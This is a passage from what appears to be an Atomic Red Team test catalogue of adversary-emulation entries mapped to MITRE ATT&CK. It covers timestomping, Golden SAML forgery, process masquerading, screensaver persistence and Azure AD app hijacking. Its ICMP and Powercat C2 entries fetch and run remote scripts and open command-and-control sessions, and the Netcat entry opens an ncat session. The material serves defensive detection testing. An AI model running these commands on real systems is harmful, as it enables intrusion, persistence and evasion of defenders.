input_arguments.cli_script.description: Path to script with file discovery commands

input_arguments.cli_script.type: path

input_arguments.cli_script.default: PathToAtomicsFolder\T1083\src\esxi_file_discovery.txt

"
T1070.006,Indicator Removal on Host: Timestomp,Set a file's access timestamp,5f9113d5-ed75-47ed-ba23-ea3573d05810,"Stomps on the access timestamp of a file
",linux,macos,,"touch -a -t 197001010000.00 #{target_filename}
",sh,,,"rm -f #{target_filename}
",,"dependencies.0.description: The file must exist in order to be timestomped

dependencies.0.prereq_command: test -e #{target_filename} && exit 0 || exit 1

dependencies.0.get_prereq_command: echo 'T1070.006 file access timestomp test' > #{target_filename}

","input_arguments.target_filename.description: Path of file that we are going to stomp on last access time

input_arguments.target_filename.type: path

input_arguments.target_filename.default: /tmp/T1070.006-access.txt

"
T1070.006,Indicator Removal on Host: Timestomp,Set a file's modification timestamp,20ef1523-8758-4898-b5a2-d026cc3d2c52,"Stomps on the modification timestamp of a file
",linux,macos,,"touch -m -t 197001010000.00 #{target_filename}
",sh,,,"rm -f #{target_filename}
",,"dependencies.0.description: The file must exist in order to be timestomped

dependencies.0.prereq_command: test -e #{target_filename} && exit 0 || exit 1

dependencies.0.get_prereq_command: echo 'T1070.006 file modification timestomp test' > #{target_filename}

","input_arguments.target_filename.description: Path of file that we are going to stomp on last access time

input_arguments.target_filename.type: path

input_arguments.target_filename.default: /tmp/T1070.006-modification.txt

"
T1070.006,Indicator Removal on Host: Timestomp,Set a file's creation timestamp,8164a4a6-f99c-4661-ac4f-80f5e4e78d2b,"Stomps on the create timestamp of a file

Setting the creation timestamp requires changing the system clock and reverting.
Sudo or root privileges are required to change date. Use with caution.
",linux,macos,,"NOW=$(date +%m%d%H%M%Y)
date 010100001971
touch #{target_filename}
date ""$NOW""
stat #{target_filename}
",sh,True,,"rm -f #{target_filename}
",,,"input_arguments.target_filename.description: Path of file that we are going to stomp on last access time

input_arguments.target_filename.type: path

input_arguments.target_filename.default: /tmp/T1070.006-creation.txt

"
T1070.006,Indicator Removal on Host: Timestomp,Modify file timestamps using reference file,631ea661-d661-44b0-abdb-7a7f3fc08e50,"Modifies the `modify` and `access` timestamps using the timestamps of a specified reference file.

This technique was used by the threat actor Rocke during the compromise of Linux web servers.
",linux,macos,,"touch -acmr #{reference_file_path} #{target_file_path}
",sh,,,"rm -f #{target_file_path}
",,"dependencies.0.description: The file must exist in order to be timestomped

dependencies.0.prereq_command: test -e #{target_file_path} && exit 0 || exit 1

dependencies.0.get_prereq_command: echo 'T1070.006 reference file timestomp test' > #{target_file_path}

","input_arguments.target_file_path.description: Path of file to modify timestamps of

input_arguments.target_file_path.type: path

input_arguments.target_file_path.default: /tmp/T1070.006-reference.txt

input_arguments.reference_file_path.description: Path of reference file to read timestamps from

input_arguments.reference_file_path.type: path

input_arguments.reference_file_path.default: /bin/sh

"
T1070.006,Indicator Removal on Host: Timestomp,Windows - Modify file creation timestamp with PowerShell,b3b2c408-2ff0-4a33-b89b-1cb46a9e6a9c,"Modifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.
To verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 1970.
",windows,,,"Get-ChildItem ""#{file_path}"" | % { $_.CreationTime = ""#{target_date_time}"" }
",powershell,,,,powershell,"dependencies.0.description: A file must exist at the path (#{file_path}) to change the creation time on

dependencies.0.prereq_command: if (Test-Path ""#{file_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Path ""#{file_path}"" -Force | Out-Null
Set-Content ""#{file_path}"" -Value ""T1551.006 Timestomp"" -Force | Out-Null

","input_arguments.target_date_time.description: Date/time to replace original timestamps with

input_arguments.target_date_time.type: string

input_arguments.target_date_time.default: 01/01/1970 00:00:00

input_arguments.file_path.description: Path of file to change creation timestamp

input_arguments.file_path.type: path

input_arguments.file_path.default: PathToAtomicsFolder\..\ExternalPayloads\T1551.006_timestomp.txt

"
T1070.006,Indicator Removal on Host: Timestomp,Windows - Modify file last modified timestamp with PowerShell,f8f6634d-93e1-4238-8510-f8a90a20dcf2,"Modifies the file last modified timestamp of a specified file. This technique was seen in use by the Stitch RAT.
To verify execution, use File Explorer to view the Properties of the file and observe that the Modified time is the year 1970.
",windows,,,"Get-ChildItem ""#{file_path}"" | % { $_.LastWriteTime = ""#{target_date_time}"" }
",powershell,,,,powershell,"dependencies.0.description: A file must exist at the path (#{file_path}) to change the modified time on

dependencies.0.prereq_command: if (Test-Path ""#{file_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Path ""#{file_path}"" -Force | Out-Null
Set-Content ""#{file_path}"" -Value ""T1551.006 Timestomp"" -Force | Out-Null

","input_arguments.target_date_time.description: Date/time to replace original timestamps with

input_arguments.target_date_time.type: string

input_arguments.target_date_time.default: 01/01/1970 00:00:00

input_arguments.file_path.description: Path of file to change modified timestamp

input_arguments.file_path.type: path

input_arguments.file_path.default: PathToAtomicsFolder\..\ExternalPayloads\T1551.006_timestomp.txt

"
T1070.006,Indicator Removal on Host: Timestomp,Windows - Modify file last access timestamp with PowerShell,da627f63-b9bd-4431-b6f8-c5b44d061a62,"Modifies the last access timestamp of a specified file. This technique was seen in use by the Stitch RAT.
To verify execution, use File Explorer to view the Properties of the file and observe that the Accessed time is the year 1970.
",windows,,,"Get-ChildItem ""#{file_path}"" | % { $_.LastAccessTime = ""#{target_date_time}"" }
",powershell,,,,powershell,"dependencies.0.description: A file must exist at the path (""#{file_path}"") to change the last access time on

dependencies.0.prereq_command: if (Test-Path ""#{file_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Path ""#{file_path}"" -Force | Out-Null
Set-Content ""#{file_path}"" -Value ""T1551.006 Timestomp"" -Force | Out-Null

","input_arguments.target_date_time.description: Date/time to replace original timestamps with

input_arguments.target_date_time.type: string

input_arguments.target_date_time.default: 01/01/1970 00:00:00

input_arguments.file_path.description: Path of file to change last access timestamp

input_arguments.file_path.type: path

input_arguments.file_path.default: PathToAtomicsFolder\..\ExternalPayloads\T1551.006_timestomp.txt

"
T1070.006,Indicator Removal on Host: Timestomp,Windows - Timestomp a File,d7512c33-3a75-4806-9893-69abc3ccdd43,"Timestomp kxwn.lock.

Successful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. 

[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)
",windows,,,"import-module ""#{file_path}\timestomp.ps1""
timestomp -dest ""#{file_path}\kxwn.lock""
",powershell,,,,powershell,"dependencies.0.description: timestomp.ps1 must be present in #{file_path}.

dependencies.0.prereq_command: if (Test-Path ""#{file_path}\timestomp.ps1"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Invoke-WebRequest ""https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1"" -OutFile ""#{file_path}\timestomp.ps1""

dependencies.1.description: kxwn.lock must be present in #{file_path}.

dependencies.1.prereq_command: if (Test-Path -path ""#{file_path}\kxwn.lock"") {exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Path ""#{file_path}\kxwn.lock"" -ItemType File

","input_arguments.file_path.description: File path for timestomp payload

input_arguments.file_path.type: string

input_arguments.file_path.default: PathToAtomicsFolder\..\ExternalPayloads

"
T1070.006,Indicator Removal on Host: Timestomp,MacOS - Timestomp Date Modified,87fffff4-d371-4057-a539-e3b24c37e564,"Stomps on the modification timestamp of a file using MacOS's SetFile utility
",macos,,,"SetFile -m #{target_date} #{target_filename}
",sh,,,"rm -f #{target_filename}
",,"dependencies.0.description: The file must exist in order to be timestomped

dependencies.0.prereq_command: test -e #{target_filename} && exit 0 || exit 1

dependencies.0.get_prereq_command: echo 'T1070.006 MacOS file modified timestomp test' > #{target_filename}

","input_arguments.target_filename.description: Path of file that we are going to stomp on last modified time


input_arguments.target_filename.type: path

input_arguments.target_filename.default: /tmp/T1070.006-modified.txt

input_arguments.target_date.description: Date to replace original timestamps with

input_arguments.target_date.type: string

input_arguments.target_date.default: 01/01/1970

"
T1606.002,Forge Web Credentials: SAML token,Golden SAML,b16a03bc-1089-4dcc-ad98-30fe8f3a2b31,"Forge a ""Golden SAML"" token which allows to impersonate any Azure AD user, and authenticate to AADGraph (as a proof). 
You will need the ADFS token signing certificate (see T1552.004 to export it).
More info here : https://o365blog.com/post/adfs/
",azure-ad,,,"Import-Module AADInternals -Force
$saml = New-AADIntSAMLToken -ImmutableID ""#{immutable_id}"" -PfxFileName ""#{certificate_path}"" -Issuer ""#{issuer_uri}""
$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache
if ($conn) { Write-Host ""`nSuccessfully connected as $($conn.User)"" } else { Write-Host ""`nThe connection failed"" }
Write-Host ""End of Golden SAML""
",powershell,,,,powershell,"dependencies.0.description: AADInternals module must be installed.

dependencies.0.prereq_command: if (Get-Module AADInternals) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Install-Module -Name AADInternals -Force

","input_arguments.certificate_path.description: Token signing certificate path. See T1552.004 to export it

input_arguments.certificate_path.type: path

input_arguments.certificate_path.default: .\ADFS_signing.pfx

input_arguments.immutable_id.description: ImmutableId of the targeted user. It can be obtained with AzureAD powershell module; $(Get-AzureADUser -SearchString ""username"").ImmutableId

input_arguments.immutable_id.type: string

input_arguments.immutable_id.default: aehgdqBTZV50DKQZmNJ8mg==

input_arguments.issuer_uri.description: Issuer URI of the ADFS service

input_arguments.issuer_uri.type: string

input_arguments.issuer_uri.default: http://contoso.com/adfs/services/trust/

"
T1095,Non-Application Layer Protocol,ICMP C2,0268e63c-e244-42db-bef7-72a9e59fc1fc,"This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener
refer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/
",windows,,,"IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
Invoke-PowerShellIcmp -IPAddress #{server_ip}
",powershell,,,,,,"input_arguments.server_ip.description: The IP address of the listening server

input_arguments.server_ip.type: string

input_arguments.server_ip.default: 127.0.0.1

"
T1095,Non-Application Layer Protocol,Netcat C2,bcf0d1c1-3f6a-4847-b1c9-7ed4ea321f37,"Start C2 Session Using Ncat
To start the listener on a Linux device, type the following: 
nc -l -p <port>
",windows,,,"cmd /c ""#{ncat_exe}"" #{server_ip} #{server_port}
",powershell,,,,powershell,"dependencies.0.description: ncat.exe must be available at specified location (#{ncat_exe})

dependencies.0.prereq_command: if( Test-Path ""#{ncat_exe}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -ItemType Directory -Force -Path ""#{ncat_path}"" | Out-Null
$parentpath = Split-Path (Split-Path ""#{ncat_exe}""); $zippath = ""$parentpath\nmap.zip""
Invoke-WebRequest  ""https://nmap.org/dist/nmap-7.80-win32.zip"" -OutFile ""$zippath""
  Expand-Archive $zippath $parentpath -Force
  $unzipPath = Join-Path $parentPath ""nmap-7.80""
if( $null -eq (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | ?{$_.DisplayName -like ""Microsoft Visual C++*""}) ) {
  Start-Process (Join-Path $unzipPath ""vcredist_x86.exe"")
}

","input_arguments.server_port.description: The port for the C2 connection

input_arguments.server_port.type: integer

input_arguments.server_port.default: 80

input_arguments.ncat_exe.description: The location of ncat.exe

input_arguments.ncat_exe.type: path

input_arguments.ncat_exe.default: PathToAtomicsFolder\..\ExternalPayloads\T1095\nmap-7.80\ncat.exe

input_arguments.ncat_path.description: The folder path of ncat.exe

input_arguments.ncat_path.type: path

input_arguments.ncat_path.default: PathToAtomicsFolder\..\ExternalPayloads\T1095

input_arguments.server_ip.description: The IP address or domain name of the listening server

input_arguments.server_ip.type: string

input_arguments.server_ip.default: 127.0.0.1

"
T1095,Non-Application Layer Protocol,Powercat C2,3e0e0e7f-6aa2-4a61-b61d-526c2cc9330e,"Start C2 Session Using Powercat
To start the listener on a Linux device, type the following: 
nc -l -p <port>
",windows,,,"IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
powercat -c #{server_ip} -p #{server_port}
",powershell,,,,,,"input_arguments.server_ip.description: The IP address or domain name of the listening server

input_arguments.server_ip.type: string

input_arguments.server_ip.default: 127.0.0.1

input_arguments.server_port.description: The port for the C2 connection

input_arguments.server_port.type: integer

input_arguments.server_port.default: 80

"
T1216,Signed Script Proxy Execution,SyncAppvPublishingServer Signed Script PowerShell Command Execution,275d963d-3f36-476c-8bef-a2a3960ee6eb,"Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.
Upon execution, calc.exe will be launched.
",windows,,,"C:\windows\system32\SyncAppvPublishingServer.vbs ""\n;#{command_to_execute}""
",command_prompt,,,,,,"input_arguments.command_to_execute.description: A PowerShell command to execute.

input_arguments.command_to_execute.type: string

input_arguments.command_to_execute.default: Start-Process calc

"
T1216,Signed Script Proxy Execution,manage-bde.wsf Signed Script Command Execution,2a8f2d3c-3dec-4262-99dd-150cb2a4d63a,"Executes the signed manage-bde.wsf script with options to execute an arbitrary command.
",windows,,,"set comspec=#{command_to_execute}
cscript %windir%\System32\manage-bde.wsf
",command_prompt,,,"set comspec=%windir%\System32\cmd.exe
",,,"input_arguments.command_to_execute.description: A command to execute.

input_arguments.command_to_execute.type: path

input_arguments.command_to_execute.default: %windir%\System32\calc.exe

"
T1036.003,Masquerading: Rename System Utilities,Masquerading as Windows LSASS process,5ba5a3d1-cf3c-4499-968a-a93155d1f717,"Copies cmd.exe, renames it, and launches it to masquerade as an instance of lsass.exe.

Upon execution, cmd will be launched by powershell. If using Invoke-AtomicTest, The test will hang until the 120 second timeout cancels the session
",windows,,,"copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe
%SystemRoot%\Temp\lsass.exe /B
",command_prompt,,,"del /Q /F %SystemRoot%\Temp\lsass.exe >nul 2>&1
",,,
T1036.003,Masquerading: Rename System Utilities,Masquerading as FreeBSD or Linux crond process.,a315bfff-7a98-403b-b442-2ea1b255e556,"Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
",linux,,,"cp /bin/sh /tmp/crond;
echo 'sleep 5' | /tmp/crond
",sh,,,"rm /tmp/crond
",,,
T1036.003,Masquerading: Rename System Utilities,Masquerading - cscript.exe running as notepad.exe,3a2a578b-0a01-46e4-92e3-62e2859b42f0,"Copies cscript.exe, renames it, and launches it to masquerade as an instance of notepad.exe.

Upon successful execution, cscript.exe is renamed as notepad.exe and executed from non-standard path.
",windows,,,"copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y
cmd.exe /c %APPDATA%\notepad.exe /B
",command_prompt,,,"del /Q /F %APPDATA%\notepad.exe >nul 2>&1
",,,
T1036.003,Masquerading: Rename System Utilities,Masquerading - wscript.exe running as svchost.exe,24136435-c91a-4ede-9da1-8b284a1c1a23,"Copies wscript.exe, renames it, and launches it to masquerade as an instance of svchost.exe.

Upon execution, no windows will remain open but wscript will have been renamed to svchost and ran out of the temp folder
",windows,,,"copy %SystemRoot%\System32\wscript.exe %APPDATA%\svchost.exe /Y
cmd.exe /c %APPDATA%\svchost.exe ""PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs""
",command_prompt,,,"del /Q /F %APPDATA%\svchost.exe >nul 2>&1
",powershell,"dependencies.0.description: Wscript file to execute must exist on disk

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/src/T1036.003_masquerading.vbs"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs""

",
T1036.003,Masquerading: Rename System Utilities,Masquerading - powershell.exe running as taskhostw.exe,ac9d0fc3-8aa8-4ab5-b11f-682cd63b40aa,"Copies powershell.exe, renames it, and launches it to masquerade as an instance of taskhostw.exe.

Upon successful execution, powershell.exe is renamed as taskhostw.exe and executed from non-standard path.
",windows,,,"copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y
cmd.exe /K %APPDATA%\taskhostw.exe
",command_prompt,,,"del /Q /F %APPDATA%\taskhostw.exe >nul 2>&1
",,,
T1036.003,Masquerading: Rename System Utilities,Masquerading - non-windows exe running as windows exe,bc15c13f-d121-4b1f-8c7d-28d95854d086,"Copies an exe, renames it as a windows exe, and launches it to masquerade as a real windows exe

Upon successful execution, powershell will execute T1036.003.exe as svchost.exe from on a non-standard path.
",windows,,,"copy ""#{inputfile}"" #{outputfile}
try { $myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id }
catch { $_; exit $_.Exception.HResult}
Stop-Process -ID $myT1036_003
",powershell,,,"Remove-Item #{outputfile} -Force -ErrorAction Ignore
",powershell,"dependencies.0.description: Exe file to copy must exist on disk at specified location (#{inputfile})

dependencies.0.prereq_command: if (Test-Path ""#{inputfile}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{inputfile}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/bin/T1036.003.exe"" -OutFile ""#{inputfile}""

","input_arguments.outputfile.description: path of file to execute

input_arguments.outputfile.type: path

input_arguments.outputfile.default: ($env:TEMP + ""\svchost.exe"")

input_arguments.inputfile.description: path of file to copy

input_arguments.inputfile.type: path

input_arguments.inputfile.default: PathToAtomicsFolder\T1036.003\bin\T1036.003.exe

"
T1036.003,Masquerading: Rename System Utilities,Masquerading - windows exe running as different windows exe,c3d24a39-2bfe-4c6a-b064-90cd73896cb0,"Copies a windows exe, renames it as another windows exe, and launches it to masquerade as second windows exe
",windows,,,"copy ""#{inputfile}"" #{outputfile}
$myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id
Stop-Process -ID $myT1036_003
",powershell,,,"Remove-Item #{outputfile} -Force -ErrorAction Ignore
",,,"input_arguments.outputfile.description: path of file to execute

input_arguments.outputfile.type: path

input_arguments.outputfile.default: ($env:TEMP + ""\svchost.exe"")

input_arguments.inputfile.description: path of file to copy

input_arguments.inputfile.type: path

input_arguments.inputfile.default: $env:ComSpec

"
T1036.003,Masquerading: Rename System Utilities,Malicious process Masquerading as LSM.exe,83810c46-f45e-4485-9ab6-8ed0e9e6ed7f,"Detect LSM running from an incorrect directory and an incorrect service account
This works by copying cmd.exe to a file, naming it lsm.exe, then copying a file to the C:\ folder.

Upon successful execution, cmd.exe will be renamed as lsm.exe and executed from non-standard path.
",windows,,,"copy C:\Windows\System32\cmd.exe C:\lsm.exe
C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt
",command_prompt,True,,"del C:\T1036.003.txt >nul 2>&1
del C:\lsm.exe >nul 2>&1
",,,
T1036.003,Masquerading: Rename System Utilities,File Extension Masquerading,c7fa0c3b-b57f-4cba-9118-863bf4e653fc,"download and execute a file masquerading as images or Office files. Upon execution 3 calc instances and 3 vbs windows will be launched.

e.g SOME_LEGIT_NAME.[doc,docx,xls,xlsx,pdf,rtf,png,jpg,etc.].[exe,vbs,js,ps1,etc] (Quartelyreport.docx.exe)
",windows,,,"copy ""#{exe_path}"" %temp%\T1036.003_masquerading.docx.exe /Y
copy ""#{exe_path}"" %temp%\T1036.003_masquerading.pdf.exe /Y
copy ""#{exe_path}"" %temp%\T1036.003_masquerading.ps1.exe /Y
copy ""#{vbs_path}"" %temp%\T1036.003_masquerading.xls.vbs /Y
copy ""#{vbs_path}"" %temp%\T1036.003_masquerading.xlsx.vbs /Y
copy ""#{vbs_path}"" %temp%\T1036.003_masquerading.png.vbs /Y
copy ""#{ps1_path}"" %temp%\T1036.003_masquerading.doc.ps1 /Y
copy ""#{ps1_path}"" %temp%\T1036.003_masquerading.pdf.ps1 /Y
copy ""#{ps1_path}"" %temp%\T1036.003_masquerading.rtf.ps1 /Y
%temp%\T1036.003_masquerading.docx.exe
%temp%\T1036.003_masquerading.pdf.exe
%temp%\T1036.003_masquerading.ps1.exe
%temp%\T1036.003_masquerading.xls.vbs
%temp%\T1036.003_masquerading.xlsx.vbs
%temp%\T1036.003_masquerading.png.vbs
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.doc.ps1
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.pdf.ps1
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.rtf.ps1
",command_prompt,,,"del /f %temp%\T1036.003_masquerading.docx.exe > nul 2>&1
del /f %temp%\T1036.003_masquerading.pdf.exe > nul 2>&1
del /f %temp%\T1036.003_masquerading.ps1.exe > nul 2>&1
del /f %temp%\T1036.003_masquerading.xls.vbs > nul 2>&1
del /f %temp%\T1036.003_masquerading.xlsx.vbs > nul 2>&1
del /f %temp%\T1036.003_masquerading.png.vbs > nul 2>&1
del /f %temp%\T1036.003_masquerading.doc.ps1 > nul 2>&1
del /f %temp%\T1036.003_masquerading.pdf.ps1 > nul 2>&1
del /f %temp%\T1036.003_masquerading.rtf.ps1 > nul 2>&1
",powershell,"dependencies.0.description: File to copy must exist on disk at specified location (#{vbs_path})

dependencies.0.prereq_command: if (Test-Path ""#{vbs_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{vbs_path}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/src/T1036.003_masquerading.vbs"" -OutFile ""#{vbs_path}""

dependencies.1.description: File to copy must exist on disk at specified location (#{ps1_path})

dependencies.1.prereq_command: if (Test-Path ""#{ps1_path}"") {exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory (split-path ""#{ps1_path}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/src/T1036.003_masquerading.ps1"" -OutFile ""#{ps1_path}""

","input_arguments.exe_path.description: path to exe to use when creating masquerading files

input_arguments.exe_path.type: path

input_arguments.exe_path.default: C:\Windows\System32\calc.exe

input_arguments.vbs_path.description: path of vbs to use when creating masquerading files

input_arguments.vbs_path.type: path

input_arguments.vbs_path.default: PathToAtomicsFolder\T1036.003\src\T1036.003_masquerading.vbs

input_arguments.ps1_path.description: path of powershell script to use when creating masquerading files

input_arguments.ps1_path.type: path

input_arguments.ps1_path.default: PathToAtomicsFolder\T1036.003\src\T1036.003_masquerading.ps1

"
T1546.002,Event Triggered Execution: Screensaver,Set Arbitrary Binary as Screensaver,281201e7-de41-4dc9-b73d-f288938cbb64,"This test copies a binary into the Windows System32 folder and sets it as the screensaver so it will execute for persistence. Requires a reboot and logon.
",windows,,,"reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg
copy #{input_binary} ""%SystemRoot%\System32\evilscreensaver.scr""
reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f
reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f
reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f
if #{reboot} NEQ 0 shutdown /r /t 0
",command_prompt,True,,"reg import %userprofile%\backup.reg
del %userprofile%\backup.reg
del %SystemRoot%\System32\evilscreensaver.scr
",,,"input_arguments.input_binary.description: Executable binary to use in place of screensaver for persistence

input_arguments.input_binary.type: path

input_arguments.input_binary.default: C:\Windows\System32\cmd.exe

input_arguments.reboot.description: Set to non-zero value if you want the test to reboot the system so that changes take effect

input_arguments.reboot.type: integer

input_arguments.reboot.default: 0

"
T1098.004,SSH Authorized Keys,Modify SSH Authorized Keys,342cc723-127c-4d3a-8292-9c0c6b4ecadc,"Modify contents of <user-home>/.ssh/authorized_keys to maintain persistence on victim host. 
If the user is able to save the same contents in the authorized_keys file, it shows user can modify the file.
",linux,macos,,"if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo ""$ssh_authorized_keys"" > ~/.ssh/authorized_keys; fi;
",sh,False,,"unset ssh_authorized_keys
",,,
T1098.001,Account Manipulation: Additional Cloud Credentials,Azure AD Application Hijacking - Service Principal,b8e747c3-bdf7-4d71-bce2-f1df2a057406,"Add a certificate to an Application through its Service Principal. The certificate can then be used to authenticate as the application.
This can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.
An account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.
",azure-ad,,,"Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential > $null

$sp = Get-AzureADServicePrincipal -SearchString ""#{service_principal_name}"" | Select-Object -First 1
if ($sp -eq $null) { Write-Warning ""Service Principal not found""; exit }

# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
$credNotAfter = (Get-Date).AddDays(1)
$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry

$cert = New-SelfSignedCertificate -DnsName ""atomicredteam.example.com"" -FriendlyName ""AtomicCert"" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider ""Microsoft Enhanced RSA and AES Cryptographic Provider"" -NotAfter $certNotAfter
$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
Write-Host ""Generated certificate """"$($cert.Thumbprint)""""""

New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier ""AtomicTest"" -Usage Verify -Value $keyValue -EndDate $credNotAfter

Start-Sleep -s 30
$tenant = Get-AzureADTenantDetail
$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint
Write-Host ""Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)""
Write-Host ""End of Hijacking""
",powershell,False,,"Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null

$sp = Get-AzureADServicePrincipal -SearchString ""#{service_principal_name}"" | Select-Object -First 1
$credz = Get-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId
foreach ($cred in $credz) {
  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq ""AtomicTest"") {
    Write-Host ""Removed $($cred.KeyId) key from SP""
    Remove-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -KeyId $cred.KeyId
  }  
}
Get-ChildItem -Path Cert:\CurrentUser\My | where { $_.FriendlyName -eq ""AtomicCert"" } | Remove-Item
",powershell,"dependencies.0.description: AzureAD module must be installed.

dependencies.0.prereq_command: try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}

dependencies.0.get_prereq_command: Install-Module -Name AzureAD -Force

","input_arguments.username.description: Azure AD username

input_arguments.username.type: string

input_arguments.username.default: jonh@contoso.com

input_arguments.password.description: Azure AD password

input_arguments.password.type: string

input_arguments.password.default: p4sswd

input_arguments.service_principal_name.description: Name of the targeted service principal

input_arguments.service_principal_name.type: string

input_arguments.service_principal_name.default: SuperSP

"
T1098.001,Account Manipulation: Additional Cloud Credentials,Azure AD Application Hijacking - App Registration,a12b5531-acab-4618-a470-0dafb294a87a,"Add a certificate to an Application through its App Registration. The certificate can then be used to authenticate as the application.
This can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.
An account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.
",azure-ad,,,"Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential > $null

$app = Get-AzureADApplication -SearchString ""#{application_name}"" | Select-Object -First 1
if ($app -eq $null) { Write-Warning ""Application not found""; exit }

# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
